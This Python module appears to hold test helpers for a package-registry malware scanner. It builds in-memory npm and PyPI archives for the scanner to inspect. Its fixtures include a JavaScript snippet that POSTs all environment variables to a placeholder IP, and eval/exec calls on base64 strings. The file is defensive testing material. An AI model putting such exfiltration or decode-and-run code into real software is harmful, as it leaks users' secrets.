"""Helpers for the test_review_*.py registry tests: archives built in memory,
scan_package driven with the network seam patched. Nothing here is a test.

Every "hostile" payload is inert text: network references use 192.0.2.x
(TEST-NET) or .invalid hosts, and nothing is ever extracted or executed."""

import gzip
import io
import json
import stat
import struct
import tarfile
import zipfile
import zlib
from unittest import mock

from lazaret.registry import repo

EXFIL_JS = ("const https = require('https');\n"
            "const body = JSON.stringify(process.env);\n"
            "https.request({host: '192.0.2.1', method: 'POST'}).end(body);\n")
DECODE_EXEC_JS = "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n"
DECODE_EXEC_PY = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
#: base64 of 240 bytes that do not repeat: 320 characters of every class, what SC-B64 reports (G-5 passes over a run
#: of one class of characters or a short period repeated, which `"QUJD" * n` and `"Zm9v" * n` are)
B64_DATA = __import__("base64").b64encode(bytes((i * 7919) % 256 for i in range(240))).decode()
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 200


def _leb(n):
    out = bytearray()
    while True:
        b, n = n & 0x7F, n >> 7
        out.append(b | (0x80 if n else 0))
        if not n:
            return bytes(out)


def _section(sid, body):
    return bytes([sid]) + _leb(len(body)) + body


def _png_chunk(kind, body):
    return len(body).to_bytes(4, "big") + kind + body + b"\0\0\0\0"


#: small whole files of the data formats SC-B64 passes over (N-4), each more than 150 bytes, so their base64 is a run
#: of 200 characters or more: a WebAssembly module (a function of 160 nops returning 42), a PNG, a GIF, a WAV
DATA_FILES = {
    "wasm": b"\0asm\x01\0\0\0" + _section(1, b"\x01\x60\x00\x01\x7f") + _section(3, b"\x01\x00")
            + _section(10, b"\x01" + _leb(164) + b"\x00" + b"\x01" * 160 + b"\x41\x2a\x0b"),
    "png": b"\x89PNG\r\n\x1a\n" + _png_chunk(b"IHDR", bytes(13)) + _png_chunk(b"IDAT", bytes(range(160)))
           + _png_chunk(b"IEND", b""),
    "gif": b"GIF89a\x01\x00\x01\x00\x80\x00\x00" + bytes([0, 0, 0, 255, 255, 255])
           + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02" + b"\xa0" + bytes(range(160)) + b"\x00\x3b",
    "wav": b"RIFF" + (4 + 24 + 8 + 160).to_bytes(4, "little") + b"WAVEfmt " + (16).to_bytes(4, "little") + bytes(16)
           + b"data" + (160).to_bytes(4, "little") + bytes(range(160)),
}
#: the same files' base64; and a payload behind a WebAssembly module's header, which is not one
DATA_B64 = {k: __import__("base64").b64encode(v).decode() for k, v in DATA_FILES.items()}
FAKE_WASM_B64 = __import__("base64").b64encode(b"\0asm\x01\0\0\0" + bytes((i * 7919) % 256 for i in range(200))).decode()


def manifest(**fields):
    """package.json text; scripts=... etc. as keyword arguments."""
    data = {"name": "x", "version": "1.0.0"}
    data.update(fields)
    return json.dumps(data, indent=2, ensure_ascii=False)


def hooks(**scripts):
    return manifest(scripts=scripts)


def tar_member(name, data=b"", typ=tarfile.REGTYPE, linkname=""):
    """One raw ustar member (header + padded data)."""
    if isinstance(data, str):
        data = data.encode()
    ti = tarfile.TarInfo(name)
    ti.type = typ
    ti.linkname = linkname
    ti.mode = 0o644
    ti.size = len(data) if typ in (tarfile.REGTYPE, tarfile.AREGTYPE) else 0
    out = ti.tobuf(tarfile.USTAR_FORMAT)
    if ti.size:
        out += data + b"\0" * (-len(data) % 512)
    return out


def tarball(files, root="package/", compress=True):
    """{path: str|bytes} -> .tgz bytes (members under `root`). A value that is
    a (typ, linkname) tuple makes a link member."""
    raw = b""
    for path, content in files.items():
        if isinstance(content, tuple):
            raw += tar_member(root + path, b"", content[0], content[1])
        else:
            raw += tar_member(root + path, content)
    raw += b"\0" * 1024
    return gzip.compress(raw) if compress else raw


def zipball(files, symlinks=None):
    """{path: str|bytes} -> zip bytes; symlinks {path: target} are stored the
    way zip/Info-ZIP stores them (S_IFLNK mode, target as the content)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for path, content in files.items():
            zf.writestr(path, content)
        for path, target in (symlinks or {}).items():
            info = zipfile.ZipInfo(path)
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            zf.writestr(info, target)
    return buf.getvalue()


def unicode_path(header, name, crc=None, version=1):
    """An Info-ZIP Unicode Path extra field (0x7075) giving an entry whose header names it `header` the name `name`
    (bytes as they are when `name` is bytes); its CRC-32 is that of the header's name unless `crc` is given."""
    data = struct.pack("<BL", version, zlib.crc32(header.encode()) if crc is None else crc)
    data += name if isinstance(name, bytes) else name.encode()
    return struct.pack("<HH", 0x7075, len(data)) + data


def zip_entries(entries):
    """[(header name, content, extra field bytes)] -> zip bytes, the entries in that order (deflated)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content, extra in entries:
            info = zipfile.ZipInfo(name)
            info.compress_type = zipfile.ZIP_DEFLATED
            info.extra = extra
            zf.writestr(info, content)
    return buf.getvalue()


def scan_bytes(data, container="tgz", artifact="npm", eco="npm", full=False, **kw):
    rv = ("1.0.0", "https://registry.npmjs.org/x/-/x-1.0.0.tgz", container, artifact, {})
    with mock.patch.object(repo, "resolve_npm", return_value=rv), \
            mock.patch.object(repo, "resolve_pypi", return_value=rv), \
            mock.patch.object(repo, "http_bytes", return_value=data), \
            mock.patch.object(repo, "verify_digest", return_value=None):
        return repo.scan_package(eco, "x", full=full, **kw)


def scan_npm(files, **kw):
    return scan_bytes(tarball(files), **kw)


def scan_sdist(files, root="x-1.0/", **kw):
    return scan_bytes(tarball(files, root=root), artifact="sdist", eco="pypi", **kw)


def scan_wheel(files, symlinks=None, **kw):
    return scan_bytes(zipball(files, symlinks), container="zip", artifact="wheel", eco="pypi", **kw)


def rules(res, sevs=None):
    return {i["rule"] for i in res["issues"] if sevs is None or i["sev"] in sevs}


def issues(res, rule):
    return [i for i in res["issues"] if i["rule"] == rule]
